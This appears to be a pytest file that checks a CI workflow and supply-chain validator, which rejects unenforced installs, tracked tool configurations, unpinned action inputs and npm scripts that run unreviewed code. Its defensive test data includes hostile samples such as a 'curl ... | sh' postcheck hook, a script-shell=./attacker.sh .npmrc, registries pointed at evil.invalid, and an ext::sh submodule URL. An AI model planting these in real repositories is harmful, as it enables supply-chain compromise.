    def holds(self, fact: str, block: tuple[int, ...]) -> bool:
        return True


def test_every_variable_bearing_template_matches_only_its_reviewed_quoting() -> None:
    checked = 0
    for template, index in _variable_bearing():
        scope = sorted(template.scopes)[0]
        reviewed = " ".join(template.tokens).replace("@VENV@", "/tmp/smoke-venv")
        commands = split_commands(reviewed.replace("@TEXT*@", "x"), closed=False)
        ctx = _EverythingHolds(scope=scope)
        # The control: the reviewed spelling itself passes this same harness.
        assert list(workflow_grammar.violations(commands[-1:], where="probe", ctx=ctx)) == []
        for spelling in _spellings(template.tokens[index]):
            tokens = list(template.tokens)
            tokens[index] = spelling
            text = " ".join(tokens).replace("@VENV@", "/tmp/smoke-venv").replace("@TEXT*@", "x")
            try:
                commands = split_commands(text, closed=False)
            except workflow_grammar.GrammarError:
                continue
            ctx = _EverythingHolds(scope=scope)
            problems = list(workflow_grammar.violations(commands, where="probe", ctx=ctx))
            assert problems, (template.tokens, spelling)
            checked += 1
    assert checked > 400, checked


def test_single_quoted_reviewed_values_are_refused(tmp_path: Path) -> None:
    """Sol r4 probes single_quoted_locked and single_quoted_smoke_wheel, verbatim."""
    locked = (
        "      - run: |\n          mkdir -p $RUNNER_TEMP/locked\n"
        "          LOCKED='$RUNNER_TEMP/locked'\n"
        "          uv export --locked --no-default-groups --no-emit-project --format"
        ' requirements.txt --output-file "$RUNNER_TEMP/locked/requirements-lock.txt"\n'
        "          python -I -m venv /tmp/smoke-venv\n"
        "          /tmp/smoke-venv/bin/pip install --require-hashes"
        ' -r "$LOCKED/requirements-lock.txt"'
    )
    assert any("LOCKED='$RUNNER_TEMP/locked'" in problem for problem in _verdict(tmp_path, locked))
    wheel = _HAND_OFF.replace('GPO_STUDIO_WHEEL="$WHEEL"', "GPO_STUDIO_WHEEL='$WHEEL'")
    assert any("GPO_STUDIO_WHEEL='$WHEEL'" in problem for problem in _verdict(tmp_path, wheel))
    reviewed = locked.replace("LOCKED='$RUNNER_TEMP/locked'", 'LOCKED="$RUNNER_TEMP/locked"')
    reviewed = reviewed.replace("mkdir -p $RUNNER_TEMP/locked", 'mkdir -p "$RUNNER_TEMP/locked"')
    assert _verdict(tmp_path, reviewed) == []


# Sol r4 B2: a fact comes only from a command whose failure would fail the job.
UNENFORCED_PROVIDERS = {
    "npm_ci_or_true": "      - run: |\n          npm ci || true\n          {use}",
    "npm_ci_continue_on_error": (
        "      - run: npm ci\n        continue-on-error: true\n      - run: {use}"
    ),
    "npm_ci_skipped_shell_branch": (
        "      - run: |\n          if [ ! -s sbom.cdx.json ]; then\n            npm ci\n"
        "          fi\n          {use}"
    ),
    "npm_ci_if_step": (
        "      - if: github.event_name == 'push'\n        run: npm ci\n      - run: {use}"
    ),
    "npm_ci_and_list": "      - run: |\n          npm ci && true\n          {use}",
    "npm_ci_pipeline": "      - run: |\n          npm ci | cat\n          {use}",
    "npm_ci_background": "      - run: |\n          npm ci &\n          {use}",
    "npm_ci_negated": "      - run: |\n          ! npm ci\n          {use}",
    "npm_ci_condition": "      - run: |\n          if npm ci; then true; fi\n          {use}",
    "npm_ci_subshell": "      - run: |\n          ( npm ci )\n          {use}",
    "npm_ci_loop": (
        "      - run: |\n          for attempt in $(seq 1 20); do npm ci; done\n          {use}"
    ),
}
_NPX = "node_modules/.bin/playwright install --with-deps chromium firefox"


@pytest.mark.parametrize("name", sorted(UNENFORCED_PROVIDERS))
def test_a_provider_whose_failure_is_tolerated_establishes_nothing(
    name: str, tmp_path: Path
) -> None:
    steps = UNENFORCED_PROVIDERS[name].format(use=_NPX)
    assert any("npm-ci" in problem for problem in _verdict(tmp_path, steps)), name


def test_tolerated_exports_and_builds_establish_nothing(tmp_path: Path) -> None:
    export = (
        "uv export --locked --no-default-groups --no-emit-project --format requirements.txt"
        " --output-file requirements-lock.txt"
    )
    install = (
        "python -I -m venv /tmp/wheel-venv\n"
        "          /tmp/wheel-venv/bin/pip install --require-hashes -r requirements-lock.txt"
    )
    tolerated = f"      - run: |\n          {export} || true\n          {install}"
    assert any("lock:requirements-lock.txt" in p for p in _verdict(tmp_path, tolerated))
    skipped = f"      - if: always()\n        run: {export}\n      - run: |\n          {install}"
    assert any("lock:requirements-lock.txt" in p for p in _verdict(tmp_path, skipped))
    build = "uv run --locked --only-group release python -I -m build --no-isolation --outdir dist"
    wheel = (
        "python -I -m venv /tmp/smoke-venv\n"
        "          /tmp/smoke-venv/bin/pip install --no-deps --no-index dist/gpo_studio-*.whl"
    )
    branch = (
        f"      - run: |\n          if [ ! -s sbom.cdx.json ]; then\n            {build}\n"
        f"          fi\n          {wheel}"
    )
    assert any("'dist'" in p for p in _verdict(tmp_path, branch))
    assert _verdict(tmp_path, f"      - run: {build}\n      - run: |\n          {wheel}") == []


def test_a_fact_holds_inside_the_block_that_established_it(tmp_path: Path) -> None:
    """The smoke script builds inside an else branch and uses the result there."""
    inside = (
        "      - run: |\n          if [ ! -s sbom.cdx.json ]; then\n            npm ci\n"
        f"            {_NPX}\n          fi"
    )
    assert _verdict(tmp_path, inside) == []


def _npm_project(directory: Path, scripts: dict[str, str]) -> Path:
    """A package.json with these scripts and the real, locked devDependencies."""
    real = json.loads((REPO_ROOT / "package.json").read_text(encoding="utf-8"))
    package = directory / "package.json"
    package.write_text(
        json.dumps(
            {"name": "probe", "devDependencies": real["devDependencies"], "scripts": scripts}
        ),
        encoding="utf-8",
    )
    lock = (REPO_ROOT / "package-lock.json").read_text(encoding="utf-8")
    (directory / "package-lock.json").write_text(lock, encoding="utf-8")
    return package


def test_a_project_npmrc_is_refused(tmp_path: Path) -> None:
    """Sol r4 probe npmrc_script_shell: script-shell replaces every script's shell."""
    package = _npm_project(tmp_path, {"test:unit": "vitest run"})
    (tmp_path / ".npmrc").write_text("script-shell=./attacker.sh\n", encoding="utf-8")
    workflow = tmp_path / "probe.yml"
    steps = "      - run: npm ci\n      - run: npm run test:unit"
    workflow.write_text(_STEP.format(env="", steps=steps), encoding="utf-8")
    problems = workflow_violations(workflow, root=tmp_path, package_json=package)
    assert any(".npmrc" in problem for problem in problems)
    (tmp_path / ".npmrc").unlink()
    assert workflow_violations(workflow, root=tmp_path, package_json=package) == []


def test_no_tracked_file_configures_the_tools_the_templates_run() -> None:
    assert configuration_violations() == []


def _repository(tmp_path: Path, files: dict[str, str]) -> Path:
    import subprocess

    for name, text in {
        "pyproject.toml": (REPO_ROOT / "pyproject.toml").read_text(encoding="utf-8"),
        "package.json": (REPO_ROOT / "package.json").read_text(encoding="utf-8"),
        "package-lock.json": (REPO_ROOT / "package-lock.json").read_text(encoding="utf-8"),
        "uv.lock": (REPO_ROOT / "uv.lock").read_text(encoding="utf-8"),
        **files,
    }.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    subprocess.run(["git", "-C", str(tmp_path), "add", "-A"], check=True)
    return tmp_path


LOCK_TEXT = (REPO_ROOT / "package-lock.json").read_text(encoding="utf-8")
TRACKED_CONFIGURATION = {
    "npmrc": {".npmrc": "script-shell=./attacker.sh\n"},
    "nested_npmrc": {"tests/frontend/.npmrc": "registry=https://evil.invalid\n"},
    "pip_conf": {"pip.conf": "[global]\nindex-url = https://evil.invalid\n"},
    "uv_toml": {"uv.toml": 'index-url = "https://evil.invalid"\n'},
    "sitecustomize": {"scripts/sitecustomize.py": "import os\n"},
    "pth": {"scripts/evil.pth": "import os\n"},
    "python_version": {".python-version": "3.15\n"},
    "gitmodules": {".gitmodules": '[submodule "x"]\n\turl = ext::sh /tmp/p\n'},
    "root_conftest": {"conftest.py": "import os\n"},
    "curlrc": {".curlrc": "url = https://evil.invalid\n"},
    "yarnrc": {".yarnrc.yml": "npmRegistryServer: https://evil.invalid\n"},
    "node_modules_shim": {"node_modules/.bin/playwright": "#!/bin/sh\n"},
    "prebuilt_dist": {"dist/gpo_studio-1.0-py3-none-any.whl": "x"},
    "dollar_path": {"$RUNNER_TEMP/locked/requirements-lock.txt": "roguepkg==1.0\n"},
    "tool_uv_index": {
        "pyproject.toml": (REPO_ROOT / "pyproject.toml")
        .read_text(encoding="utf-8")
        .replace("[tool.uv]\n", '[tool.uv]\nindex-url = "https://evil.invalid"\n'),
    },
    # Sol r5 B3/B4 and their class: what an allowed tool loads from the checkout.
    "analyzer_custom_rules": {
        "PSScriptAnalyzerSettings.psd1": "@{ CustomRulePath = @('./evil.psm1') }\n",
    },
    "build_py_shadows_build": {"build.py": "print('BUILD_SHADOW_RAN')\n"},
    "build_package_shadows_build": {"build/__init__.py": "print('BUILD_SHADOW_RAN')\n"},
    "venv_py_shadows_venv": {"venv.py": "print('shadow')\n"},
    "scripts_json_shadows_stdlib": {"scripts/json.py": "print('shadow')\n"},
    "tests_pytest_shadow": {"tests/pytest.py": "print('shadow')\n"},
    "tracked_pyc": {"scripts/__pycache__/check_safety.cpython-313.pyc": "x"},
    "prettier_plugin_config": {".prettierrc.json": '{"plugins": ["./evil.mjs"]}\n'},
    "nested_eslint_config": {"tests/frontend/eslint.config.mjs": "export default [];\n"},
    "vite_config": {"vite.config.mjs": "export default {};\n"},
    "postcss_config": {"postcss.config.cjs": "module.exports = {plugins: [require('./x')]};\n"},
    "coveragerc": {".coveragerc": "[run]\nplugins = evil\n"},
    "mypy_ini": {"mypy.ini": "[mypy]\nplugins = evil\n"},
    "hatch_build_hook": {"hatch_build.py": "print('hook')\n"},
    "mypy_plugin_table": {
        "pyproject.toml": (REPO_ROOT / "pyproject.toml")
        .read_text(encoding="utf-8")
        .replace("[tool.mypy]\n", '[tool.mypy]\nplugins = ["evil"]\n'),
    },
    "unknown_tool_table": {
        "pyproject.toml": (REPO_ROOT / "pyproject.toml").read_text(encoding="utf-8")
        + '\n[tool.coverage.run]\nplugins = ["evil"]\n',
    },
    "lock_without_integrity": {
        "package-lock.json": json.dumps(
            {
                "lockfileVersion": 3,
                "packages": {
                    "": {},
                    **{
                        key: {k: v for k, v in value.items() if k != "integrity"}
                        for key, value in json.loads(LOCK_TEXT)["packages"].items()
                        if key
                    },
                },
            }
        ),
    },
    "uv_lock_without_hash": {
        "uv.lock": (REPO_ROOT / "uv.lock")
        .read_text(encoding="utf-8")
        .replace(', hash = "sha256:', ', digest = "sha256:', 1),
    },
    "package_manager": {
        "package.json": json.dumps(
            {
                **json.loads((REPO_ROOT / "package.json").read_text(encoding="utf-8")),
                "packageManager": "yarn@4.0.0",
            }
        ),
    },
}


@pytest.mark.parametrize("name", sorted(TRACKED_CONFIGURATION))
def test_a_tracked_tool_configuration_is_refused(name: str, tmp_path: Path) -> None:
    root = _repository(tmp_path, TRACKED_CONFIGURATION[name])
    assert configuration_violations(root), name


def test_the_configuration_control_repository_is_clean(tmp_path: Path) -> None:
    assert configuration_violations(_repository(tmp_path, {"tests/conftest.py": "x = 1\n"})) == []


def test_the_npm_programs_must_come_from_the_lock(tmp_path: Path) -> None:
    """Sol r5 B1: `npm ci` of a lock without Playwright, then npx fetched it from the registry."""
    package = tmp_path / "package.json"
    package.write_text(json.dumps({"name": "probe", "version": "1.0.0"}), encoding="utf-8")
    lock = {
        "name": "probe",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "requires": True,
        "packages": {"": {"name": "probe", "version": "1.0.0"}},
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock), encoding="utf-8")
    workflow = tmp_path / "probe.yml"
    for install in (_NPX, "npx playwright install --with-deps chromium firefox"):
        steps = f"      - run: npm ci\n      - run: {install}"
        workflow.write_text(_STEP.format(env="", steps=steps), encoding="utf-8")
        problems = workflow_violations(workflow, root=tmp_path, package_json=package)
        assert any("no locked package provides playwright" in p for p in problems), problems
    # A range in package.json is not the locked version, even with the real lock.
    loose = _npm_project(tmp_path, {})
    declared = json.loads(loose.read_text(encoding="utf-8"))
    declared["devDependencies"]["@playwright/test"] = "^1.61.1"
    loose.write_text(json.dumps(declared), encoding="utf-8")
    steps = f"      - run: npm ci\n      - run: {_NPX}"
    workflow.write_text(_STEP.format(env="", steps=steps), encoding="utf-8")
    problems = workflow_violations(workflow, root=tmp_path, package_json=loose)
    assert any("not pinned to one version" in p for p in problems), problems
    # The control: the real package.json and lock pass.
    _npm_project(tmp_path, {})
    assert (
        workflow_violations(workflow, root=tmp_path, package_json=tmp_path / "package.json") == []
    )


def test_a_service_or_container_image_is_refused(tmp_path: Path) -> None:
    """Sol r5 B2, verbatim: GitHub starts service images before any reviewed step."""
    service = "services:\n      unlocked:\n        image: ghcr.io/example/outside-both-locks:latest"
    (problem,) = _verdict(tmp_path, "      - run: uv sync --locked --extra dev", env=service)
    assert "services" in problem


def test_python_runs_isolated_from_the_checkout(tmp_path: Path) -> None:
    """Sol r5 B4: without -I, a tracked build.py (or venv.py) runs in place of the tool."""
    for unisolated in (
        "uv run --locked --only-group release python -m build --no-isolation --outdir dist",
        "python -m venv /tmp/smoke-venv",
        "uv run --locked python scripts/check_safety.py",
        "python scripts/check_sbom_shape.py sbom.cdx.json",
        "python -P scripts/check_sbom_shape.py sbom.cdx.json",
    ):
        assert _verdict(tmp_path, f"      - run: {unisolated}"), unisolated
    assert (
        _verdict(tmp_path, "      - run: python -I scripts/check_sbom_shape.py sbom.cdx.json") == []
    )


ACTION_INPUTS = {
    "setup_uv_latest": (
        "astral-sh/setup-uv@20cfd1bf945f4377ade1205e4dbc17946fc9a30d",
        "version: latest",
    ),
    "setup_node_url": (
        "actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444",
        "node-version: https://example.invalid/node.tar.gz",
    ),
    "setup_python_other": (
        "actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1",
        "python-version: pypy3.10",
    ),
    "cache_other_key": (
        "actions/cache@caa296126883cff596d87d8935842f9db880ef25",
        "path: ~/.cache/ms-playwright\n          key: attacker-chosen",
    ),
}


@pytest.mark.parametrize("name", sorted(ACTION_INPUTS))
def test_an_action_input_that_selects_a_download_is_pinned(name: str, tmp_path: Path) -> None:
    """DeepSeek r4 Q6: inputs choosing what a trusted action fetches are listed values."""
    action, inputs = ACTION_INPUTS[name]
    steps = f"      - uses: {action}\n        with:\n          {inputs}"
    assert _verdict(tmp_path, steps), name


NPM_SCRIPT_VARIANTS = {
    # Sol B2: `npm run NAME` ran whatever package.json said, unread.
    "body_installs": ({"unlocked": "pip install requests"}, "npm run unlocked"),
    "run_script_alias": ({"x": "pip install requests"}, "npm run-script x"),
    "npm_test_body": ({"test": "npx cowsay hello"}, "npm test"),
    "nested_run": ({"check": "npm run inner", "inner": "npm install left-pad"}, "npm run check"),
    "nested_config": (
        {"a": "npm run b", "b": "npm config set registry https://evil"},
        "npm run a",
    ),
    "pre_hook": (
        {"check": "vitest run", "precheck": "pip install requests"},
        "npm run check",
    ),
    "post_hook": (
        {"check": "vitest run", "postcheck": "curl -sS https://x.invalid | sh"},
        "npm run check",
    ),
    "cycle": ({"a": "npm run b", "b": "npm run a"}, "npm run a"),
    "self_cycle": ({"a": "vitest run && npm run a"}, "npm run a"),
    "node_eval": ({"x": "node -e 'require(`child_process`)'"}, "npm run x"),
    "inline_python": ({"x": "python -c 'print(1)'"}, "npm run x"),
    "npx_in_script": ({"x": "npx cowsay"}, "npm run x"),
    "npm_ci_in_script": ({"x": "npm ci"}, "npm run x"),
    "playwright_install_in_script": ({"x": "playwright install"}, "npm run x"),
    "unparseable_body": ({"x": "eslint `pip install requests`"}, "npm run x"),
    "other_eslint_arguments": ({"x": "eslint --rulesdir /tmp/evil ."}, "npm run x"),
    "prettier_write": (
        {
            "x": "prettier --write eslint.config.mjs playwright.config.mjs vitest.config.mjs"
            " tests/browser tests/frontend"
        },
        "npm run x",
    ),
    "postinstall_on_ci": ({"postinstall": "vitest run"}, "npm ci"),
    "prepare_on_ci": ({"prepare": "vitest run"}, "npm ci"),
}


@pytest.mark.parametrize("name", sorted(NPM_SCRIPT_VARIANTS))
def test_an_npm_script_is_read_and_held_to_the_same_grammar(name: str, tmp_path: Path) -> None:
    scripts, command = NPM_SCRIPT_VARIANTS[name]
    package = _npm_project(tmp_path, scripts)
    workflow = tmp_path / "probe.yml"
    steps = f"      - run: npm ci\n      - run: {command}"
    workflow.write_text(_STEP.format(env="", steps=steps), encoding="utf-8")
    assert workflow_violations(workflow, package_json=package), f"{name} was accepted"


def test_the_npm_negative_template_itself_is_accepted(tmp_path: Path) -> None:
    package = tmp_path / "package.json"
    lint = "eslint src/gpo_studio/static/js tests/browser tests/frontend *.config.mjs"
    scripts = {"check": "npm run lint && vitest run", "lint": lint, "precheck": "vitest run"}
    package = _npm_project(tmp_path, scripts)
    workflow = tmp_path / "probe.yml"
    steps = "      - run: npm ci\n      - run: npm run check"
    workflow.write_text(_STEP.format(env="", steps=steps), encoding="utf-8")
    assert workflow_violations(workflow, package_json=package) == []


def test_every_real_npm_script_but_format_is_in_the_grammar(tmp_path: Path) -> None:
    """`format` rewrites tracked sources, so no workflow may run it; every other one may."""
    scripts = json.loads((REPO_ROOT / "package.json").read_text(encoding="utf-8"))["scripts"]
    runnable = sorted(set(scripts) - {"format"})
    steps = "".join(f"      - run: npm run {name}\n" for name in runnable)
    assert _verdict(tmp_path, f"      - run: npm ci\n{steps}") == []
    assert _verdict(tmp_path, "      - run: npm ci\n      - run: npm run format")


def test_ci_checks_the_lockfile_matches_pyproject() -> None:
    ci = (WORKFLOWS / "ci.yml").read_text(encoding="utf-8")
    assert "run: uv lock --check" in _job_block(ci, "test")


def test_every_setup_uv_installs_the_same_exact_uv_the_project_requires() -> None:
    """DeepSeek N4: the action was pinned, the uv it installed floated."""
    import yaml

    versions = []
    for path in WORKFLOW_FILES:
        for job in (yaml.safe_load(path.read_text(encoding="utf-8"))["jobs"] or {}).values():
            for step in job.get("steps") or []:
                if str(step.get("uses", "")).startswith("astral-sh/setup-uv@"):
                    versions.append(str((step.get("with") or {}).get("version", "")))
    assert len(versions) >= 10, versions
    assert len(set(versions)) == 1, f"setup-uv installs different uv versions: {set(versions)}"
    (version,) = set(versions)
    assert re.fullmatch(r"\d+\.\d+\.\d+", version), version
    tool = tomllib.loads((REPO_ROOT / "pyproject.toml").read_text(encoding="utf-8"))["tool"]["uv"]
    floor = re.fullmatch(r">=(\d+)\.(\d+)\.(\d+)", tool["required-version"])
    assert floor is not None, tool["required-version"]
    assert tuple(map(int, version.split("."))) >= tuple(map(int, floor.groups()))


def test_the_published_requirements_are_runtime_only() -> None:
    """No dev extra and no dependency group may leak into the operator's lock."""
    import yaml

    release = yaml.safe_load((WORKFLOWS / "release.yml").read_text(encoding="utf-8"))
    exports = [
        command.words
        for step in release["jobs"]["publish"]["steps"]
        if "run" in step
        for command in split_commands(str(step["run"]))
        if command.words[:2] == ["uv", "export"] and "requirements-lock.txt" in command.words
    ]
    # Not --no-dev: build-backend is a default group, and --no-dev would keep it.
    assert exports == [
        [
            "uv",
            "export",
            "--locked",
            "--no-default-groups",
            "--no-emit-project",
            "--format",
            "requirements.txt",
            "--output-file",
            "requirements-lock.txt",
        ]
    ]


def test_requirements_lock_is_checksummed_attested_and_published() -> None:
    publish = _job_block((WORKFLOWS / "release.yml").read_text(encoding="utf-8"), "publish")
    sums = re.search(r"sha256sum (?P<args>[^>]*)> SHA256SUMS", publish.replace("\\\n", " "))
    assert sums is not None
    assert "requirements-lock.txt" in sums["args"].split()

    provenance = publish.split("actions/attest-build-provenance", 1)[1].split("- name:", 1)[0]
    subjects = provenance.split("subject-path: |", 1)[1].split()
    assert "requirements-lock.txt" in subjects and "SHA256SUMS" in subjects

    create = publish.split('gh release create "$GITHUB_REF_NAME"', 1)[1].split("--verify-tag")[0]
    assert "requirements-lock.txt" in create.split()

    export = publish.index("--output-file requirements-lock.txt")
    assert publish.index("--no-isolation --outdir dist\n") < export, (
        "export after the build, or the file can be swept into the sdist"
    )
    assert export < publish.index("bash scripts/installed_package_smoke.sh")


def _powershell_blocks() -> list[list[str]]:
    text = QUICKSTART.read_text(encoding="utf-8")
    return [block.splitlines() for block in re.findall(r"```powershell\n(.*?)```", text, re.S)]


def test_the_quickstart_installs_the_wheel_from_the_lock() -> None:
    """Each wheel install is locked, or is the fallback for a release without the file."""
    wheel_installs = 0
    locked_installs = 0
    for block in _powershell_blocks():
        for index, line in enumerate(block):
            if "pip install" not in line:
                continue
            if "--require-hashes -r $Requirements.FullName" in line:
                locked_installs += 1
                continue
            if "$Wheel.FullName" not in line:
                assert line.strip() == "& $Python -m pip install --upgrade pip", line
                continue
            wheel_installs += 1
            if "--no-deps --no-index" in line:
                continue
            previous = next(text for text in reversed(block[:index]) if text.strip())
            assert previous.strip() == "} else {", (
                f"an unlocked wheel install outside the no-lockfile fallback: {line!r}"
            )
    # install, upgrade and rollback: one locked path and one fallback each.
    assert wheel_installs == 6
    assert locked_installs == 3


def test_the_quickstart_verifies_the_lockfile_and_the_attestations() -> None:
    text = QUICKSTART.read_text(encoding="utf-8")
    checksum = next(
        "\n".join(block)
        for block in _powershell_blocks()
        if any("Expected exactly one gpo_studio wheel" in line for line in block)
    )
    assert "requirements-lock\\.txt$" in checksum
    assert "foreach ($File in @($Wheel, $Requirements)" in checksum
    # The attestation instruction names the workflow release.yml attests with.
    assert "gh attestation verify $File.FullName --repo hraedon/gpo-studio" in text
    assert "--signer-workflow hraedon/gpo-studio/.github/workflows/release.yml" in text
    release = (WORKFLOWS / "release.yml").read_text(encoding="utf-8")
    assert "actions/attest-build-provenance" in _job_block(release, "publish")


def test_every_locked_quickstart_install_ends_with_pip_check() -> None:
    """Install, upgrade and rollback alike (DeepSeek N7: rollback had none)."""
    for block in _powershell_blocks():
        text = "\n".join(block)
        for locked in re.findall(r"if \(\$Requirements\) \{\n(.*?)\n\} else \{", text, re.S):
            assert "--require-hashes -r $Requirements.FullName" in locked
            assert locked.rstrip().splitlines()[-2].strip() == "& $Python -m pip check", locked
    count = sum("\n".join(block).count("& $Python -m pip check") for block in _powershell_blocks())
    assert count == 3
